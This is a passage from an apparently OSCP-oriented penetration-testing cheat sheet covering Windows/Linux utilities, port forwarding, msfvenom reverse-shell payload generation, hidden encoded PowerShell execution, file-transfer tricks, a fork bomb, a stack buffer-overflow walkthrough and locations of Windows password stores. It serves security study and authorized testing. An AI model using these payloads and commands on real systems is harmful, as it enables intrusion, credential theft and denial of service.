Get-NetLocalGroup <ip>

# determine access control on a directory
Get-PathACL <dirname>

# list true users (including derived access) underlying an AD group
Get-NetGroupMember <groupname> -Recurse| ?{!$_.IsGroup}| %{$_.MemberName}| select-object -unique
```

* Port forwarding with Metasploit
```sh
meterpreter> portfwd add -l <attackport> -p <victomport> -r <victimip>
                             ^               ^
where we access locally _____|               |_____ what we want access to on the victim
```

* Port forwarding with `plink.exe`; requires running an SSH daemon on your attack machine
```bat
:: remote port forwarding: we bind <victimip>'s port <victimport> to our local port <attackport>,
:: tunnelling the traffic over our SSH server at <attackip>
plink.exe <attackip> -P 22 -C -R 127.0.0.1:<attackport>:<victimip>:<victimport>

:: local port forwarding
plink.exe <attackip> -P 22 -C -L <victimip>:<forwardport>:<victimip>:<listenport>
```


## Building Custom Payloads

* List payloads
``` sh
msfvenom -l payloads | grep windows
```

* Simple reverse shell for 32-bit Windows
``` sh
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o servicename.exe
```

* JSP
``` sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp
```

* WAR
``` sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

* Creating a Python payload (for Windows x86 architecture), ignoring bad characters
``` sh
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.100 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
                                                                                                     ^                     ^
                                                                         how we encode our payload __|                     |
                                                                                                                           |
                                                                       characters to exclude from our generated payload ___|
```


## Linux General Utilities

* Manipulate `PATH`
```sh
PATH=$PATH:/home/myaddition
```

* Install local packages
``` sh
# RPM (-e removes)
rpm -ivh *.rpm

# DEB (-r removes)
dpkg -I *.deb
```

* Process manipulation
``` sh
# kill a process by pid
kill <pid>

# kill a process by name
pkill <name>
killall <name>

# change process priorty; range -19 (most important) to 19 (least important)
renice <pid>
```

* `service` / `chkconfig` / `update-rc.d` manipulation
``` sh
# service start / stop
service <service> start
service <serivce> stop

# chkconfig start / stop
chkconfig <service> on [--level 3]
chkconfig <service> off [--level 3]

# update-rc.d (for modifying startup services); requires -f if /etc/init.d file exists
update-rc.d <service> defaults
update-rc.d -f <service> remove
```

* User manipulation
``` sh
# add a user
useradd -m <username>

# change a user's password
passwd <username>

# remove a user
rmuser <username>

# add a new user group
groupadd <groupname>

# add an existing user to a group; useful for adding a user to sudo group
usermod -a -G <groupname> <username>

# add an existing user to multiple groups
usermod -a -G <groupname1>,<groupname2>,<groupname3> <username>

# change a user's primary group
usermod -g <groupname> <username>
```

* File downloads / uploads
``` sh
# grab a URL
wget <url> -O url.txt -o /dev/null
curl <url> > <outfilename>

# FreeBSD specific
fetch <url> -o <outfilename>

# remote put file
scp /tmp/file <username>@<ip>:/tmp/file

# remote get file
scp <username>@<ip>:/tmp/file /tmp/file
```

* Serve files via HTTP
``` sh
# Python 2
python -m SimpleHTTPServer 80

# Python 3
python3 -m http.server

# Ruby
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"

# PHP
php -S 0.0.0.0:80
```

* File information / comparison / encoding (try [rumkin](http://rumkin.com/tools/cipher/) and [quipqiup](https://quipqiup.com/) for detecting atypical encodings)
``` sh
# determine file type / info
file <filename>

# diff two files
diff <filename1> <filename2>

# MD5 hash of file
md5sum <filename>

# SHA1 hash of file
sha1sum <filename>

# hash all files in a directory; useful for looking for modified files
find . -type f -exec md5sum {} \;

# base64 encode
base64 <plaintext>
openssl base64 <plaintext>

# base 64 decode
base64 -d <b64encodedtext>
openssl base64 -d <b64encodedtext>

# write a base64 payload to a file; makes sending things like webshells easier
echo -n <b64payload> | base64 -d | tee <destinationfilename>

# hex decode
echo -n <hex> | xxd -ps -r

# view hidden contents in an image
steghide extract -sf <file>
```

* File creation / deletion / modification
``` sh
# recursively remove a directory; be cautious with this
rm -rf <dir>

# delete a file
shred -f -u <filename>

# create file / update timestamp to now (if file already exists)
touch <filename>

# update a file's timestamp
touch -t YYYYMMDDHHSS <filename>

# match a file's timestamp to a reference file
touch -r <ref_filename> <filename>

# modify a file's immutable bit
chattr <+/->i <filename>
```

* File searching
``` sh
# find all files with a certain extension (.pdf in below example)
find . -type f -iname '*.pdf'

# find all files created between two dates
find / -type f -newermt <year>-<month>-<date> ! -newermt <year>-<month>-<date> -ls 2>/dev/null

# find all files in a directory created within the last hour
find . -ctime -60

# recursive search for pattern; add -l to just list filename of matching files
grep -Rnw '/path/to/somewhere/' -e 'pattern'

# search only for files with a certain extension
grep --include=*.java -Rnw '/path/to/somewhere/' -e 'pattern'

# exclude certain extensions from a search
grep --exclude=*.o -Rnw '/path/to/somewhere/' -e 'pattern'

# exclude directiories from a search
grep --exclude-dir={dir1,dir2,*.dst} -Rnw '/path/to/somewhere/' -e 'pattern'

# grep using regex
grep -E 'keyword1|keyword2|keyword3' <filename>

# grep other useful flags
-l --> just list filename of matching files
-i --> case-insensitive searching; slows search by non-trivial amount
-R --> follows symbolic links, in contrast to -r

# workaround for grep versions that don't support recursive search
find . -name '*.js' -exec grep -i 'string to search for' {} \; -print

# get unique lines from a file (in sorted order)
sort -u <filename>

# source code search
ack 'string to search for' <filenames>

# add a new file type .citrus for an ack search
ack --type-set=cit=.citrus --cit 'foo'

# view printable characters in a file
strings <filename>
```

* File chunking
``` sh
# cut block 1K-3K from a file
dd skip=1000 count=2000 bs=8 if=<infilename> of=<outfilename>

# split a file into 9K chunks
split -b 9K <filename> <outfilenameprefix>

# make a random 3MB file
dd if=/dev/urandom of=<outfilename> bs=3145728 count=100
```

* Archive creation / extraction
``` sh
# create / extract .tar
tar cf <outfilename>.tar <filenames>
tar xf <archivename>.tar

# create / extract .tar.gz
tar czf <outfilename>.tar.gz <filenames>
tar xzf <archivename>.tar.gz

# create / extract .tar.bz2
tar cjf <outfilename>.tar.bz2 <filenames>
tar xjf <archivename>.tar.bz2

# compress a file
gzip <filename>

# decrompress gzipped file
gzip -d <archivename>.gz
gunzip <archivename>.gz

# UPX package an executable
upx -9 -o out.exe orig.exe

# create a zipped archive
zip -r <outfilename>.zip <filenames>
```

* Examine an image
``` sh
binwalk -Me <imagefile>
```

* Win <-> Nix
``` sh
# to *nix format
dos2unix <filename>

# to win format
awk 'sub("$"."\r")' unix.txt > win.txt
```

* Command searching
``` sh
# find a related command
apropos <subject>

# get the path to a program name
which <progname>
```

* Command history
``` sh
# view history
history

# execute specified line number in history
!<num>
```

* Manipulating command output
``` sh
# turn off line wrapping from a command with long output
<cmd> | less -S
```

* Power cycling
``` sh
# shutdown immediately
sudo shutdown now
sudo poweroff
sudo init 0

# shutdown in one minute
sudo shutdown 1

# shutdown in hours/minutes from now
sudo shutdown 22:00

# cancel a scheduled shutdown
shutdown -c

# shut down OS without powering off the machine
sudo shutdown --halt
sudo halt

# reboot the system
sudo shutdown -r
sudo reboot
sudo init 6

# invoke reboot(2) syscall
sudo poweroff --force
```

* Fork bomb
``` sh
:(){:|:&};:
```


## Windows General Utilities

* Nice reference: [Living Off the Land](https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md)

* Show Kali Windows binaries
``` sh
ls -lR /usr/share/windows-binaries/
```

* Base64 encode/decode
```bat
certutil -encode <infilename> <outfilename>
certutil -decode <infilename> <outfilename>
```

* File transfers
``` bat
:: http via powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('<url>','<destinationpath>')"

:: construct wget.vbs
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
cscript wget.vbs <url> <outfilename>

:: ftp interactive client; listen with Metasploit `auxiliary/server/ftp` module
ftp.exe <ip>

:: ftp non-interactive client (executes commands line-by-line from specified file)
:: specify `open <ip>` on first line of command file
ftp.exe -s:<filename>

:: tftp client; may need to manually enable on newer versions of Windows (listen with Metasploit `auxiliary/server/tftp`)
pkgmgr /iu:"TFTP"
tftp.exe -i <ip> GET <filename>
tftp.exe -i <ip> PUT <filename>

:: netcat; listen on receiving end with `nc -lvp <port> > <outfile>`
nc.exe -w 3 <ip> <port> < <infile>

:: smb; run a local smb server on kali with `impacket-smbserver <sharename> <directory>`
:: a nice recipe to make your payloads available on \\<yourip>\transfer: `impacket-smbserver transfer /usr/share/windows-binaries/`
net view \\<attackip>
dir \\<attackip>\<share>
copy \\<attackip>\<share>\<filename> .

:: python HTTP request; works on pretty old Python versions and would work on Linux, too
python.exe -c "import urllib; urllib.urlretrieve('<url>', '<outfile>')"

:: certutil urlcache; NOTE: this is detected as malware in Windows 10 Defender
certutil -urlcache -f <url> <fout>
```


## Powershell Utilities

* Working with the environment
```posh
# list all environment variables
ls env:

# dump an object as JSON
$pwd | ConvertTo-Json -Depth 2
```

* Networking information
```posh
# equivalent to `ipconfig /all`
gip

# show network adapters
get-netadapter

# print the routing table for a specified network adapter
get-netadapter "<adaptername>" | get-netroute

# show active network connections
Get-NetTCPConnection | ? State -eq Established | sort Localport | FT -Autosize

# show DNS cache
Get-DnsClientCache

# get mapped drives
Get-SmbMapping

# map a network drive
New-SmbMapping -LocalPath <driveletter>: -RemotePath <netpath>

# `ping` equivalent
Test-Connection <ip>

# continuous `ping` equivalent
Test-Connection <ip> -Count 999999999

# test if remote TCP port is open
tnc <ip> -p <port>

# DNS lookup
resolve-dnsname <host>
```

* Base64
```posh
# base64 encode/decode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("<plaintext>"))
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<base64string>"))

# execute a base64-encoded command; use above line to generate the base64 payload (something weird is going on with encoding via alternative methods)
powershell -NoP -sta -NonI -W Hidden -enc <base64cmd>
```

* Searching files
```posh
# recursive file search (includes hidden files)
Get-ChildItem -Path <topfolder> -Include <path> -Recurse -ErrorAction SilentlyContinue -Force

# list all files modified today
ls | ?{$_.LastWriteTime -ge [DateTime]::Today}

# Resolve paths to all special folders
[enum]::getvalues([system.environment+specialfolder]) | foreach {"$_ maps to " + [system.Environment]::GetFolderPath($_)}
```

* Querying event logs
```posh
# display all logs
Get-WinEvent -ListLog * -EA silentlycontinue

# query recent events from all logs
Get-WinEvent -ListLog * -EA silentlycontinue | where-object { $_.recordcount -AND $_.lastwritetime -gt [datetime]::today} | Foreach-Object { get-winevent -LogName $_.logname -MaxEvents 1 } | Format-Table TimeCreated, ID, ProviderName, Message -AutoSize -Wrap
```

* SIDs
```posh
# get the SID of a user; for local users, set the domain to the computer name
[wmi] "win32_userAccount.Domain='<domain>',Name='<username>'"

# get the logon name from an SID
([System.Security.Principal.SecurityIdentifier]"<sid>").Translate([System.Security.Principal.NTAccount]).value
```

* Processes
```posh
# map processes to versions of MSCRT DLLs
gps | select ProcessName -exp Modules -ea 0 | where {$_.modulename -match 'msvc'} | sort ModuleName | Format-Table ProcessName -GroupBy ModuleName
```

* WinRM
```posh
# configure attack machine to work with WinRM and add victim machines as trusted hosts
# below is using a wildcard for trusted hosts for convenience, but this is not best practice
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *

# test whether the target is configured for WinRM
Test-WSMan <target>

# execute remote command on the target
Invoke-Command -Computer <target> -ScriptBlock {<cmd>} -credential <domain>\<username>

# open interactive shell on the target
Enter-PSSession -Computer <target> -credential <domain>\<username>
```

* Querying printers
```posh
# view print shares on a computer
get-printer -computername <computername> | where Type -eq Local | select ComputerName, Name, ShareName, Location, Comment | Out-GridView

# view print queues in an error state
Get-Printer -ComputerName <computername> | where PrinterStatus -eq Error | fl Name,JobCount
```


## Buffer Overflows

* Useful links / resources
  * [Computerphile - Buffer overflow attack (a nice intro)](https://youtu.be/1S0aBV-Waeo)
  * [NCC Group - Win32 exploits from scratch](https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
  * [Do Stack Buffer Overflow Good](https://github.com/justinsteven/dostackbufferoverflowgood)
  * [Corelan - Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  * [Bulb Security - Finding Bad Characters with `monay.py`](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
  * [IppSec example of bypassing DEP and ASLR](https://youtu.be/K05mJazHhF4)
  * [`mona.py`](https://github.com/corelan/mona)

* Cross-platform endianness check; note that this will be little for x86 systems
```sh
python -c "import sys; print(sys.byteorder)"
```

* Convert a number to little-endian
```sh
$ python
>>> import struct
>>> struct.pack('<I', 0xdeadbeef)
'\xEF\xBE\xAD\xDE'
```

* Convert register value to byte string
```sh
python -c "print(bytes.fromhex('<hex>'))"
```

* Generating shellcode to pop calc; useful to eliminate network issues from the process
```sh
msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
```

* Checking DEP on Windows
```bat
:: check configured DEP; you want nx set to OptIn; nx set to AlwaysOn means we need to change it
bcdedit /enum {current}

:: try turning DEP off; this requires reboot to take effect
bcdedit /set {current} nx AlwaysOff
```

* Installing and configuring `mona.py`
```sh
# first, drop mona.py in the PyCommands folder of your Immunity Debugger application folder

# check for valid installation
!mona

# configure logging output
!mona config -set workingfolder c:\logs\%p
```

* Finding EIP offset
```sh
# generate a unique sequence; two alternative methods shown
msf-pattern_create -l <numbytes>
!mona pc <numbytes>

# identify the byte offset from the 4-byte address that overwrites EIP; three alternative methods shown
# msf-pattern_offset accepts either the raw register contents (8 numeric digits) or the byte string
# equivalent (4 hex digits)
msf-pattern_offset <4bytes>
!mona pattern_offset <4bytes>
!mona findmsp

# in mona output, look for EIP offset and length of ESP (which gives you the possible max size of your payload)
```

* Determining bad characters in our running application (common ones include null `0x00`, lf `0x0a`, and cr `0x0d`)
```sh
# begin by generating a byte array of all possible characters; we will funnel these through the
# vulnerable buffer in our vulnerable application and see which ones are "rejected" (i.e., altered
# in the memory dump)
!mona bytearray

# enumerate over bad characters and compare the output files to what is in-memory; we continue this
# until we see "unmodified" status in the output
# <startaddr> will be the address at which mona begins the search for the character sequence in memory,
# you probably want this to be the address pointed to by ESP if that buffer will hold your shellcode
# your exploit must be updated with changes in the byte sequence, too
!mona compare -f c:\logs\slmail\bytearray.bin -a 0x<startaddr>
!mona bytearray -cpb \x00
!mona compare -f c:\logs\slmail\bytearray.bin -a 0x<startaddr>
!mona bytearray -cpb \x00\x0a
!mona compare -f c:\logs\slmail\bytearray.bin -a 0x<startaddr>
!mona bytearray -cpb \x00\x0a\x0d
!mona compare -f c:\logs\slmail\bytearray.bin -a 0x<startaddr>
...

# you can also do this manually via Python or C; the complete byte sequence is shown below
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

* Jumping via ESP
```sh
# we need to find a way to jump to the address pointed to by ESP from our controlled EIP; mona.py can find this for us
!mona jmp -r esp

# it is important to note that we must look for options not protected by ASLR and which do not
# contain bad characters; bad characters can be excluded in the search with
!mona jmp -r esp -cpb "\x00\x0a"

# mona's above search may be limited to code segments, but without DEP we have access to data
# program segments, too; we can begin a more in-depth search by inspecting all modules which
# could provide our desired jump
!mona modules

# the above output will give us a list of DLLs and other modules that we can jump from; we want
# to look for options with all security options (such as SafeSEH and ASLR) disabled; we also want
# rebase to be disabled

# we next find the literal opcode of our desired JMP ESP instruction
msf-nasm_shell
nasm > JMP ESP
00000000  FFE4              jmp esp

# finally, we can search for where FFE4 naturally occurs in our previously identified DLL / module
!mona find -s "\xFF\xE4" -m <modulename>

# again, we must choose from the found list of addresses, making sure to avoid bad characters;
# it may be prudent to manually check the contents of the found address to ensure that it indeed
# contains a JMP ESP instruction; rember that this address may need to be reversed in little-endian
# style in our payload
```

* Generating your payload
```sh
# make sure to exclude bad characters; this is the `-b "\x00\x0d"` part of the below line
msfvenom -p windows/shell_reverse_tcp LHOST=<attackip> LPORT=<attackport> -f c -e x86/shikata_ga_nai -b "\x00\x0d"

# since Metasploit will attempt to decode our payload in the first few bytes of its execution (thus pushing/popping
# values from the stack and consequently writing over the first few bytes of our payload), we should pad our
# buffer with NOPs (i.e., something like `'\x90' * 10`); an alternative approach involves executing an instruction
# to point ESP somewhere far away from our shellcode via `sub esp,240h` or `add esp,-240h` (note: we ALWAYS want
# ESP to be divisible by 4)

# for multi-threaded applications, you may achieve a more graceful exit from your payload with the `EXITFUNC=thread`
# option specified during payload generation
```

* Finding offset of syscalls in libc (useful for ASLR brute-forcing)
```sh
# find path to libc
ldd <vulnerablebinary> | grep libc

# offset will be the value in the second column
readelf -s <pathtolibc> | grep <syscallname>
```


## Windows Reference

* Versions

| ID      | Version |
| ------- | ------------- |
| NT 3.1  | Windows NT 3.1 (All) |
| NT 3.5  | Windows NT 3.5 (All) |
| NT 3.51 | Windows NT 3.51 (All) |
| NT 4.0  | Windows NT 4.0 (All) |
| NT 5.0  | Windows 2000 (All) |
| NT 5.1  | Windows XP (Home, Pro, MC, Tablet PC, Starter Embedded) |
| NT 5.2  | Windows XP (64-bit, Pro 64-bit) |
|         | Windows Server 2003 & R2 (Standard, Enterprise) |
|         | Windows Home Server |
| NT 6.0  | Windows Vista (Starter, Home, Basic, Home Premium, Business, Enterprise, Ultimate) |
|         | Windows Server 2008 (Foundation, Standard, Enterprise) |
| NT 6.1  | Windows 7 (Starter, Home, Pro, Enterprise, Ultimate) |
|         | Windows Server 2008 R2 (Foundation, Standard, Enterprise) |
| NT 6.2  | Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM)) |
|         | Windows Phone 8 |
|         | Windows Server 2012 (Foundation, Essentials, Standard) |

* Directories

| Path                                                              | Description |
| ----------------------------------------------------------------- | ----------- |
| `%SYSTEMROOT%`                                                    | Typically `C:\Windows` |
| `%SYSTEMROOT%\System32\drivers\etc\hosts`                         | DNS entries |
| `%SYSTEMROOT%\System32\drivers\etc\networks`                      | Network settings |
| `%SYSTEMROOT%\System32\config\SAM`                                | User & password hashes |
| `%SYSTEMROOT%\repair\SAM`                                         | Backup copy of SAM |
| `%SYSTEMROOT%\System32\config\RegBack\SAM`                        | Backup copy of SAM |
| `%WINDIR%\System32\config\AppEvent.Evt`                           | Application log |
| `%WINDIR%\System32\config\SecEvent.Evt`                           | Security log |
| `%ALLUSERSPROFILE%\Start Menu\Programs\Startup\`                  | Startup location |
| `%USERPROFILE%\Start Menu\Programs\Startup`                       | Startup location |
| `%SYSTEMROOT%\Prefetch`                                           | Prefetch dir (EXE logs) |
| `$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules` | Powershell user-level module path default |
| `$Env:windir\System32\WindowsPowerShell\v1.0\Modules`             | Powershell computer-level module path default |

* DLL loading search order
  * Directory from which the application is loaded
  * `C:\Windows\System32`
  * `C:\Windows\System`
  * `C:\Windows`
  * Current working directory
  * Directories in system `PATH`
  * Directories in user `PATH`

* Registry entries (some of these need slight modification for more recent Windows versions)

| Key                                                                                              | Description |
| ------------------------------------------------------------------------------------------------ | ----------- |
| `"HKLM\Software\Microsoft\Windows NT\CurrentVersion"`                                            | OS information |
| `"HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v ProductName`                             | product name |
| `"HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v InstallDate`                             | install date |
| `"HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner`                         | registered owner |
| `"HKLM\Software\Microsoft\Windows NT\CurrentVersion" /v SystemRoot`                              | system root |
| `HKLM\System\CurrentControlSet\Control\TimeZoneInformation /v ActiveTimeBias`                    | time zone (with offset in minutes from UTC) |
| `"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU"`                | mapped network drives |
| `HKLM\System\MountedDevices`                                                                     | mounted devices |
| `HKLM\System\CurrentControlSet\Enum\USB`                                                         | USB devices |
| `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter`                      | IP forwarding |
| `HKLM\SYSTEM\Current\ControlSet\Services\SNMP`                                                   | SNMP parameters |
| `HKLM\Security\Policy\Secrets`                                                                   | password keys |
| `"HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"`                                   | ^ |
| `HKLM\Security\Policy\PolAdTev`                                                                  | audit policy |
| `HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services`                                  | kernel/user services |
| `HKLM\Software`                                                                                  | machine installed software |
| `HKCU\Software`                                                                                  | user installed software |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`                             | recent documents |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU & \OpensaveMRU` | recent user locations |
| `"HKCU\Software\Microsoft\Internet Explorer\TypedURLs"`                                          | typed URLs |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`                                 | MRU lists |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKey`                      | last registry key access |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce`                                  | startup locations |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`                           | ^ |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce`                                  | ^ |
| `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run`                          | ^ |
| `HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password`                                        | RealVNC hashed password |
| `HKCU\Software\SimonTatham\PuTTY\Sessions`                                                       | Putty proxy credentials |

* Windows IIS to OS version mapping

| IIS Version | OS |
| ----------- | -- |
| 1.0         | Windows NT Server 3.51 |
| 2.0         | Windows NT Server 4.0 |
| 3.0         | Windows NT Server 4.0 |
| 4.0         | Windows NT Server 4.0 SP3 |
| 5.0         | Windows 2000 |
| 5.1         | Windows XP Professional |
| 6.0         | Windows Server 2003 |
| 7.0         | Windows Vista |
|             | Windows Server 2008 |
| 7.5         | Windows 7 |
|             | Windows Server 2008 R2 |
| 8.0         | Windows 8 |
|             | Windows Server 2012 |


## Networking Reference

* Common ports

| Port   | Protocol |
| ------ | -------- |
| 21     | FTP |
| 22     | SSH |
| 23     | Telnet |
| 25     | SMTP |
| 49     | TACACS |
| 53     | DNS |
| 67/8   | DHCP |
| 69     | TFTP |
| 80     | HTTP |
| 88     | Kerberos |
| 110    | POP3 |
| 111    | RPC |
| 123    | NTP |
| 135    | Windows RPC |
| 137    | NetBIOS |
| 138    | NetBIOS |
| 139    | SMB |
| 143    | IMAP |
| 161    | SNMP |
| 179    | BGP |
| 201    | AppleTalk |
| 389    | LDAP |
| 443    | HTTPS |
| 445    | SMB |
| 500    | ISAKMP |
| 514    | Syslog |
| 520    | RIP |
| 546/7  | DHCPv6 |
| 587    | SMTP |
| 902    | VMWare |
| 1080   | Socks Proxy |
| 1194   | VPN |
| 1433/4 | MS-SQL |
| 1521   | Oracle |
| 1629   | DameWare |
| 2049   | NFS |
| 3128   | Squid Proxy |
| 3306   | MySQL |
| 3389   | RDP |
| 5060   | SIP |
| 5985/6 | WinRM |
| 5222   | Jabber |
| 5432   | Postgres |
| 5666   | Nagios |
| 5900   | VNC |
| 6000   | X11 |
| 6129   | DameWare |
| 6667   | IRC |
| 9001   | Tor |
| 9001   | HSQL |
| 9090/1 | Openfire |
| 9100   | Jet Direct |

* TTL fingerprinting

| TTL | OS |
| --- | -- |
| 128 | Windows |
| 64  | Linux |
| 255 | Network |
| 255 | Solaris |


## Console / Bash Quick Reference

* terminal / `tmux` shortcuts (see [IppSec tmux intro](https://youtu.be/Lqehvpe_djs))

| Key(s) | Action |
| ------ | ------ |
| `ctrl-b` | default `tmux` prefix |
| `<prefix> -> <num>` | switch to corresponding window |
| `<prefix> -> c`| create new window |
| `<prefix> -> d`| detach from attached session |
| `<prefix> -> ,`| rename window |
| `<prefix> -> [`| enter edit mode |
| ^ | use `?` and `/` for Vim-style searching |
| ^ | enter copy mode with space-bar |
| `<prefix> -> ]` | paste what you copied in edit mode |
| `<prefix> -> %`| vertical pane split |
| `<prefix> -> "`| horizontal panel split |
| `<prefix> -> <arrowkeys>`| move between split panes |
| `<prefix> + <arrowkeys>` | resize active pane |
| `<prefix> -> z`| toggle active pane full-screen ("zoom-in") |
| `<prefix> -> }`| swap active pane to right |
| `<prefix> -> {`| swap active pane to left |
| `<prefix> -> <space>`| move around pane layout |
| `<prefix> -> t` | view current time |
| `<prefix> -> ?`| view `tmux` help |
| `ctrl-r` | reverse history search |
| `alt + .` | cycle through history argument-by-argument |
| `ctrl-a`| move to beginning of line |
| `ctrl-e`| move to end of line |
| `ctrl + <arrow>`| move word-by-word |

* `tmux` commands
```sh
# make sure to add below to ~/.tmux.conf
set-window-option -g mode-keys vi

# create a new session
tmux new -s <name>

# attach to an existing session
tmux attach -t <target>
```


## Useful Links

* [Exploit DB](https://www.exploit-db.com/)
* [WPScan Exploit Database](https://wpvulndb.com/)
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [MySQL cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [Esaping Restricted Linux Shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)
* [`tcpdump` reference](https://danielmiessler.com/study/tcpdump/)
* [`tmux` shortcuts](https://gist.github.com/MohamedAlaa/2961058)
* [PWK/OSCP checklist](https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3)
* [Dumping Windows Credentials](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)
* [Transferring files from Kali to Windows](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
* [Hakluke's Ultimate OSCP Guide](https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
* [NTLM crack](https://hashkiller.co.uk/ntlm-decrypter.aspx)
* [Collection of command / reference cheatsheets](https://github.com/OlivierLaflamme/Cheatsheet-God)
* [File Transfer cheatsheet](https://www.cheatography.com/fred/cheat-sheets/file-transfers/)
* [Helpful OSCP cheatsheet](https://github.com/xMilkPowderx/OSCP)